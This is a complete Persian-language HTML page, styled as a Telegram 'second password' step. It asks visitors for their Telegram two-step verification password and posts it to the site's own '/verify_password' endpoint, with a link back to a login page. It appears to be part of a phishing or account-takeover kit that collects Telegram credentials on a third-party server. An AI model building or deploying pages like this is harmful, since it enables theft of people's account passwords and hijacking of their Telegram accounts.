<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز دوم</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Vazir', 'Tahoma', sans-serif;
            background: linear-gradient(135deg, #fdf6e3, #f5e6ca);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: #ffffff;
            border-radius: 24px;
            padding: 40px 36px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.10), 0 8px 20px rgba(0, 0, 0, 0.06);
            transition: transform 0.3s ease;
        }

        .container:hover {
            transform: translateY(-4px);
        }

        .logo {
            text-align: center;
            font-size: 48px;
            margin-bottom: 6px;
        }

        h2 {
            text-align: center;
            color: #3d2c1b;
            font-weight: 700;
            font-size: 24px;
            margin-bottom: 4px;
        }

        .subtitle {
            text-align: center;
            color: #8a7a6a;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .warning-box {
            background: #fef3e8;
            border-radius: 16px;
            padding: 12px 16px;
            text-align: center;
            margin-bottom: 22px;
            font-size: 14px;
            color: #8a5a2a;
            border: 1px solid #f5dcc8;
        }

        .warning-box span {
            font-size: 20px;
            margin-left: 6px;
        }

        .form-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #4a3724;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #ede5d8;
            border-radius: 14px;
            font-size: 16px;
            background: #faf8f5;
            transition: border 0.3s, box-shadow 0.3s;
            outline: none;
            font-family: inherit;
        }

        input:focus {
            border-color: #e8850e;
            box-shadow: 0 0 0 4px rgba(232, 133, 14, 0.15);
            background: #ffffff;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #e8850e, #d97706);
            color: #ffffff;
            border: none;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 25px rgba(232, 133, 14, 0.35);
        }

        .btn:active {
            transform: scale(0.97);
        }

        .back-link {
            display: block;
            text-align: center;
            margin-top: 18px;
            color: #b0a090;
            font-size: 14px;
        }

        .back-link a {
            color: #e8850e;
            text-decoration: none;
            font-weight: 600;
        }

        .back-link a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .container {
                padding: 28px 20px;
            }
            h2 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔑</div>
        <h2>رمز دوم</h2>
        <p class="subtitle">حساب شما رمز دوم دارد</p>

        <div class="warning-box">
            <span>🔐</span> برای ادامه، رمز دوم تلگرام خود را وارد کنید
        </div>

        <form method="post" action="/verify_password">
            <div class="form-group">
                <label>🔑 رمز دوم</label>
                <input type="password" name="password" placeholder="رمز دوم خود را وارد کنید" required autofocus>
            </div>
            <button type="submit" class="btn">✅ تایید</button>
        </form>

        <div class="back-link">
            <a href="/">↩️ برگشت به صفحه ورود</a>
        </div>
    </div>
</body>
</html>
